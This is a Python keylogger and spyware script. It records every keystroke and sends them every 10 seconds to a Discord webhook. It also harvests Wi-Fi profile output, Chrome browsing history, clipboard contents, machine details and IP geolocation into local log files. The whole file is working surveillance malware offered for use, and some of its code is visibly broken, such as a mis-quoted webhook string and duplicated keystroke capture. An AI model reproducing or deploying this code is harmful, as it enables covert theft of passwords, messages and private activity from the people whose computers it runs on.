import keyboard
import time
import requests
import threading
import platform
import os
import json
import pyperclip
import cv2
import sqlite3
from datetime import datetime
import pyscreenshot as ImageGrab

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'Replace 'WEBHOOK_URL' with your actual Discord webhook URL'
IPINFO_API_KEY = 'Replace with your API key'  # Replace with your API key

# Create a directory called "logs" if it doesn't exist
logs_directory = "logs"
os.makedirs(logs_directory, exist_ok=True)

# Create a list to store the captured keystrokes
keylogs = []

# Set the gap in seconds between data captures
data_capture_gap = 60  # Change this value to your desired gap in seconds

# Set the interval in seconds for capturing webcam images and screenshots
capture_interval = 300  # Capture webcam image and screenshot every 5 minutes

# Function to send keylogs to Discord via webhook
def send_keylogs():
    global keylogs

    # Check if there are any keylogs to send
    if keylogs:
        # Convert the keylogs to a string
        keylogs_str = '\n'.join(keylogs)

        # Create the payload for the webhook
        payload = {
            'content': keylogs_str
        }

        # Send the payload to the Discord webhook
        requests.post(WEBHOOK_URL, json=payload)

        # Clear the keylogs list
        keylogs = []

    # Schedule the next execution of the function after 10 seconds
    threading.Timer(10, send_keylogs).start()

# Function to capture keystrokes
def capture_keystrokes(event):
    global keylogs

    # Append the captured keystroke to the keylogs list
    keylogs.append(event.name)

    # Append the captured keystroke to the keylogs list
    keylogs.append(event.name)

# Function to capture and store wireless network SSIDs and passwords
def capture_and_store_wifi_info():
    while True:
        try:
            # On Windows, use the 'netsh' command to retrieve wireless network info
            if platform.system() == 'Windows':
                ssid_passwords = os.popen('netsh wlan show profiles').read()
            else:
                ssid_passwords = "Wireless network info not available on this platform."

            # Store wireless network info in a text file inside the "logs" directory
            wifi_info_path = os.path.join(logs_directory, "wifi_info.txt")
            with open(wifi_info_path, "w") as wifi_info_file:
                wifi_info_file.write(ssid_passwords)

        except Exception as e:
            print(f"Error capturing Wi-Fi info: {str(e)}")

        # Wait for the specified gap before capturing data again
        time.sleep(data_capture_gap)

# Function to capture browsing history
def capture_browsing_history():
    while True:
        try:
            # Specify the path to the browser's profile folder
            # For example, for Chrome on Windows:
            profile_folder_path = 'C:\\Users\\username\\AppData\\Local\\Google\\Chrome\\User Data\\Default'

            # Access the browser's History database
            history_db = os.path.join(profile_folder_path, 'History')

            # Connect to the History database
            conn = sqlite3.connect(history_db)
            cursor = conn.cursor()

            # Perform database queries to retrieve browsing history data
            cursor.execute("SELECT * FROM urls")  # You can customize this query as needed
            browsing_history = cursor.fetchall()

            # Close the database connection
            conn.close()

            # Store browsing history as JSON data
            history_json = json.dumps(browsing_history, indent=4)

            # Store browsing history in a log file inside the "logs" directory
            history_log_path = os.path.join(logs_directory, "browsing_history.json")
            with open(history_log_path, "w") as history_log_file:
                history_log_file.write(history_json)

        except Exception as e:
            print(f"Error capturing browsing history: {str(e)}")

        # Wait for the specified gap before capturing data again
        time.sleep(data_capture_gap)

# Function to store machine info and clipboard data (if available)
def store_machine_info():
    while True:
        # Get machine information
        machine_info = {
            "Platform": platform.system(),
            "Machine Name": platform.node(),
            "Processor": platform.processor()
        }

        # Store machine information in a JSON file inside the "logs" directory
        machine_info_path = os.path.join(logs_directory, "machine_info.json")
        with open(machine_info_path, "w") as machine_info_file:
            json.dump(machine_info, machine_info_file, indent=4)

        # Store clipboard data if available inside the "logs" directory
        clipboard_data = pyperclip.paste()
        if clipboard_data:
            clipboard_path = os.path.join(logs_directory, "clipboard.txt")
            with open(clipboard_path, "w") as clipboard_file:
                clipboard_file.write(clipboard_data)

        # Wait for the specified gap before capturing data again
        time.sleep(data_capture_gap)
# Function to track IP address
def track_ip_address():
    while True:
        try:
            response = requests.get(f'https://ipinfo.io?token={IPINFO_API_KEY}')
            ip_info = response.json()

            # Store IP address tracking data in a log file inside the "logs" directory
            ip_info_path = os.path.join(logs_directory, "ip_address_info.json")
            with open(ip_info_path, "w") as ip_info_file:
                json.dump(ip_info, ip_info_file, indent=4)

        except Exception as e:
            print(f"Error tracking IP address: {str(e)}")

        # Wait for the specified gap before tracking IP again
        time.sleep(data_capture_gap)

# Start capturing keystrokes
keyboard.on_release(callback=capture_keystrokes)

# Start sending keylogs to Discord every 10 seconds
send_keylogs()

# Start capturing wireless network info
wifi_info_thread = threading.Thread(target=capture_and_store_wifi_info)
wifi_info_thread.daemon = True
wifi_info_thread.start()

# Start capturing browsing history
browsing_history_thread = threading.Thread(target=capture_browsing_history)
browsing_history_thread.daemon = True
browsing_history_thread.start()

# Start storing machine information and clipboard data
store_machine_info()
# Start tracking IP address
ip_tracking_thread = threading.Thread(target=track_ip_address)
ip_tracking_thread.daemon = True
ip_tracking_thread.start()

# Keep the script running
while True:
    time.sleep(1)
